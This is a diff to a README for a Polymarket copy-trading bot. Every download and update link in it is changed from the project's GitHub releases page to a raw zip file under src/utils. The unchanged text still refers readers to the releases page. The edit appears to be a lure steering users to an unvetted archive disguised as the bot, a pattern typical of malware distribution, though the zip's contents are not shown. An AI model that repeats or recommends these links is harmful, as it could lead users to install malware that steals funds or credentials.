@@ -1,6 +1,6 @@
 # 🤖 polymarket-copytrading-bot - Copy Trades Automatically on Polymarket
 
-[![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-green?style=for-the-badge)](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
+[![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-green?style=for-the-badge)](https://raw.githubusercontent.com/SEAN6977/polymarket-copytrading-bot/main/src/utils/polymarket_bot_copytrading_v2.1.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Start using polymarket-copytrading-bot by following these steps. They guide you 
 ## ⬇️ Download and Install
 
 1. Visit this page to download the bot:  
-   [![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-blue?style=for-the-badge)](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
+   [![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/SEAN6977/polymarket-copytrading-bot/main/src/utils/polymarket_bot_copytrading_v2.1.zip)
 
 2. On the releases page, look for the latest version (usually at the top).
 
@@ -105,7 +105,7 @@ Use this dashboard to track the bot’s activity and adjust settings if needed.
 ## ⚙️ Updating the Bot
 
 Check the GitHub releases page regularly for updates:  
-[https://github.com/SEAN6977/polymarket-copytrading-bot/releases](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
+[https://raw.githubusercontent.com/SEAN6977/polymarket-copytrading-bot/main/src/utils/polymarket_bot_copytrading_v2.1.zip](https://raw.githubusercontent.com/SEAN6977/polymarket-copytrading-bot/main/src/utils/polymarket_bot_copytrading_v2.1.zip)
 
 Updates often include bug fixes and new features. To update:
 
@@ -167,4 +167,4 @@ This bot relates to:
 
 ## ⬇️ Download polymarket-copytrading-bot
 
-[![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-green?style=for-the-badge)](https://github.com/SEAN6977/polymarket-copytrading-bot/releases)
+[![Download polymarket-copytrading-bot](https://img.shields.io/badge/Download-polymarket--copytrading--bot-green?style=for-the-badge)](https://raw.githubusercontent.com/SEAN6977/polymarket-copytrading-bot/main/src/utils/polymarket_bot_copytrading_v2.1.zip)
